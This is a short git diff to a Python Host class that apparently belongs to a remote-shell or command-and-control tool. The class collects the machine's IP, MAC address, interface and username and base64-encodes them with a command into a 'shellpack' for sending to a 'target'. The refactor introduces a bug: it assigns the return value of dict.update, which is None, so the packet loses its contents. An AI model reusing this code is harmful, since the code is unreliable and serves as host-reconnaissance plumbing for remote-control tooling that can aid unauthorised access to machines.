@@ -15,7 +15,7 @@ class Host:
         self.iface = get_iface(self.ip)
         self.mac = get_mac(self.iface)
         self.user = pwd.getpwuid(os.getuid())[0]
-        self.heartbeat = 0
+        self.status = "STANDBY"
 
     def __str__(self) -> str:
         report =  f"[ Host Information ]\n"
@@ -55,17 +55,31 @@ class Host:
         shellpack = {
             "command": command,
             "message": message,
-            "data" : data,
-            "ip": self.ip,
-            "mac": self.mac,
-            "iface": self.iface,
-            "user": self.user,
-            "heartbeat": self.heartbeat
+            "data" : data
             }
-
+        
+        info_dict = self.to_dict()
+        shellpack = shellpack.update(info_dict)
         shellpack = str(shellpack).encode('utf-8')
         shellpack = base64.b64encode(shellpack)
         return shellpack
+    
+    def to_dict(self) -> dict:
+        
+        out_dict = {
+                "ip": self.ip,
+                "mac": self.mac,
+                "iface": self.iface,
+                "user": self.user,
+                "status": self.status
+                }
+
+        return out_dict
+        
+
+    def update_status(self, status):
+        self.status = status
+        print(f" - Status of target {self.ip} has been updated to {status}")
 
     def send(self, ip, command: str, message: str | None = None, data: str | None = None) -> bool:
         shellpack = self.build_shellpack(command, message, data)
